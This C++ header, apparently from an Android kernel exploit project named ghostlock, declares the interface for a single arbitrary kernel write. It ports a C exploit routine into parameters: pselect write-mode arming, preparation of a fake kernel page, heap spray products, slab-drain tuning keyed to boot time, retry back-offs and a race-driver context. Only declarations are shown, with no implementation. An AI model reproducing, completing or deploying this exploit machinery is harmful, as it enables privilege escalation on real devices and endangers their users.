#pragma once
/** @file jni/write_one.hpp
 *  One write, parameterised. Source: bddfea4:src/core/main.c:367-398.
 *
 *  The C original was already parameterised -- it took a target, a description, a mode and a
 *  leaf flag, and read no configuration of its own. What it did read was file-scope
 *  machinery: the direct-map bounds, the pselect write-mode globals, the prepared page, the
 *  spray state, and the route. Those are what this header turns into a parameter, so the
 *  function body can stay a copy.
 *
 *  Two things the C body did that belong to its caller now:
 *    in_direct_map(target)      -> WriteOneParams.direct_map_begin / direct_map_end
 *    run_main_route_threads()   -> a function pointer, so the route step is not a hidden call
 */
#include <cstdint>

#include "jni/race_driver.hpp"

namespace ghostlock::jni {
    /** The write itself: the four values the C entry took. */
    struct WriteOneParams final {
        std::uintptr_t target = 0U;
        const char *desc = nullptr;
        std::int32_t mode = 0;
        std::int32_t leaf = 0;
    };

    /** What the spray produced; the arm check reads the right word from here. */
    struct SprayProducts final {
        /** The prepared kernel page base (prepare_good_kernel_page result). */
        std::uintptr_t page_base = 0U;
        /** The right word the leaf arm stores zeros into; the arm test reads it. */
        std::uintptr_t fake_right = 0U;
    };

    /**
     *  The three steps the C body performed through file scope. They are seams on purpose:
     *  an omission must be a named refusal at the call site, not a step quietly left out.
     */
    struct WriteSeams final {
        /** Arm the pselect write mode for this target (C: set_pselect_write_mode).
         *  @return false to refuse the write by name. */
        bool (*set_write_mode)(std::uintptr_t target, std::int32_t mode, void *ctx) = nullptr;
        /** Prepare the kernel page (C: prepare_good_kernel_page). Fills products.page_base. */
        bool (*prepare_page)(SprayProducts &products, void *ctx) = nullptr;
        /** Clear what the mode and the page left behind (C: clear_pselect_write). */
        void (*clear_write)(void *ctx) = nullptr;
        void *context = nullptr;
    };

    /**
     *  The tuning of the retry wrapper and its drain, from main.c:1029-1058 and :437-443.
     *
     *  Five numbers that were literals in the original: two back-off waits inside the retry
     *  loop (100000 after a failed route, 50000 after a successful verify), and the drain of
     *  the slab before the first attempt -- which keyed two of its values off the boot time,
     *  with a threshold at 60 seconds selecting one of two wave and batch pairs.
     */
    struct RetryTuning final {
        /** The wait after a route that did not produce a verified write. */
        std::uint32_t route_failed_backoff_usec = 0U;
        /** The wait after a verify that succeeded, before the next attempt. */
        std::uint32_t verified_settle_usec = 0U;
        /** The boot-time threshold, in seconds, that selects the two drain pairs. */
        std::uint32_t drain_boot_threshold_sec = 0U;
        /** The drain wave count below and above that threshold. */
        std::uint32_t drain_waves_young = 0U;
        std::uint32_t drain_waves_old = 0U;
        /** The drain batch size below and above that threshold. */
        std::uint32_t drain_batch_young = 0U;
        std::uint32_t drain_batch_old = 0U;
    };

    /** The bounds the direct-map check used, taken from the caller. */
    struct DirectMapBounds final {
        std::uintptr_t begin = 0U;
        std::uintptr_t end = 0U;
    };

    /**
     *  Write once at a target.
     *
     *  @param params  the four values the C entry took.
     *  @param bounds  the direct-map bounds; a target outside them is refused, not retried.
     *  @param context the race context this write drives, passed through to the route step.
     *  @return 1 on a routed write, 0 on any refusal.
     *  @note The refusal for a target outside the direct map is the C comment verbatim: such a
     *        target is wrong by construction, so it is worth neither a spray nor a retry.
     */
    [[nodiscard]] int do_one_write(const WriteOneParams &params, const DirectMapBounds &bounds,
                                   race::RaceContext &context, SprayProducts &products,
                                   const WriteSeams &seams) noexcept;
}  // namespace ghostlock::jni
